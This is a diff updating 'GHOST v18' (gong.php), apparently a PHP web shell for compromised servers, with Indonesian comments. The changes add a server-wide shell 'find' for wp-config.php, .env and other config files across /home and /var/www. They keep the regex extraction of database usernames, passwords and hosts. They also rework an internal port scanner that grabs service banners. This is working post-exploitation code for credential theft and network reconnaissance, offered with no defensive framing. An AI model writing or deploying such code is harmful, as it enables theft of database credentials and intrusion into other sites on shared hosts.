@@ -2,7 +2,7 @@
 // language: PHP 7.4-8.3, file: gong.php, target: PHP-FPM/Apache mod_php
 // GHOST v18 - section 0..6: Full UI, Fix JSON, Advanced DB, Deep Scan.
 
-define('GH_VER',      '18.0.0-s6');
+define('GH_VER',      '18.0.0-s6-fix');
 define('GH_TAG',      'gong');
 define('GH_STATE_DIR', gh_state_dir());
 define('GH_LOG_FILE',   GH_STATE_DIR . '/gh_log_' . md5(__FILE__) . '.log');
@@ -284,19 +284,29 @@ function gh_vuln_scan() {
 function gh_db_harvest() {
     $logs = array(); $info = array(); $root = isset($_SERVER['DOCUMENT_ROOT']) ? $_SERVER['DOCUMENT_ROOT'] : @getcwd();
     
-    // Auto-discovery: Cari file config secara recursive (max depth 3)
+    // 1. Cari pake exec find (jauh lebih cepat & dalam, ke seluruh server)
+    $logs[] = "[*] Scanning config via find (seluruh server)...";
+    $find_res = gh_exec_adv("find /home /var/www /var/www/html -maxdepth 4 -type f \\( -name 'wp-config.php' -o -name 'configuration.php' -o -name '.env' -o -name 'database.php' -o -name 'settings.php' -o -name 'config.php' \\) 2>/dev/null");
+    
     $found_configs = array();
-    $stack = array($root);
-    $depth = 0;
-    while ($stack && $depth < 3) {
-        $current = array_pop($stack);
-        $files = @scandir($current);
-        if (!$files) continue;
-        foreach ($files as $f) {
-            $path = $current . '/' . $f;
-            if (is_dir($path) && $f !== '.' && $f !== '..' && $f !== 'node_modules' && $f !== 'vendor') { $stack[] = $path; $depth++; }
-            elseif (preg_match('/^(wp-config|configuration|config|database|settings|env|\.env)(\.php|\.inc|\.json|\.xml)?$/i', $f)) {
-                $found_configs[] = $path;
+    if (isset($find_res['out']) && is_string($find_res['out'])) {
+        $lines = explode("\n", trim($find_res['out']));
+        foreach ($lines as $l) { if (trim($l)) $found_configs[] = trim($l); }
+    }
+    
+    if (empty($found_configs)) {
+        $logs[] = "[-] find gagal/kosong, fallback ke recursive scandir di webroot...";
+        $stack = array($root);
+        while ($stack) {
+            $current = array_pop($stack);
+            $files = @scandir($current);
+            if (!$files) continue;
+            foreach ($files as $f) {
+                $path = $current . '/' . $f;
+                if (is_dir($path) && $f !== '.' && $f !== '..' && $f !== 'node_modules' && $f !== 'vendor') { $stack[] = $path; }
+                elseif (preg_match('/^(wp-config|configuration|config|database|settings|env|\.env)(\.php|\.inc|\.json|\.xml)?$/i', $f)) {
+                    $found_configs[] = $path;
+                }
             }
         }
     }
@@ -306,11 +316,8 @@ function gh_db_harvest() {
         $c = gh_read($cf);
         if ($c) {
             $logs[] = "[+] Config ditemukan: $cf";
-            // Pola User
             if (preg_match('/(?:DB_USER|username|user|db_user)\s*[=\'"]+\s*([^\'";\s]+)/i', $c, $m)) $db_user = $m[1];
-            // Pola Pass
             if (preg_match('/(?:DB_PASSWORD|password|pass|db_pass)\s*[=\'"]+\s*([^\'";\s]+)/i', $c, $m)) $db_pass = $m[1];
-            // Pola Host
             if (preg_match('/(?:DB_HOST|host|db_host)\s*[=\'"]+\s*([^\'";\s]+)/i', $c, $m)) $db_host = $m[1];
             if ($db_user && $db_pass) break;
         }
@@ -396,12 +403,14 @@ function gh_port_scan($target = '127.0.0.1', $ports = null, $timeout = 0.3) {
     }
     $open = array();
     foreach ($ports as $p) {
-        // Dibungkus @ (suppress warning) biar gak ngerusak JSON
-        $fp = @fsockopen($target, $p, $en, $es, $timeout);
-        if ($fp) {
+        // GUNAKAN stream_socket_client, JANGAN fsockopen. Error di-suppress total.
+        $errno = 0; $errstr = '';
+        $fp = @stream_socket_client("tcp://$target:$p", $errno, $errstr, $timeout, STREAM_CLIENT_CONNECT);
+        if ($fp !== false && is_resource($fp)) {
             $banner = '';
             @stream_set_timeout($fp, 1);
             $banner = @fread($fp, 1024);
+            if ($banner === false) $banner = '';
             @fclose($fp);
             $open[] = array('port' => $p, 'banner' => substr(trim($banner), 0, 100));
         }
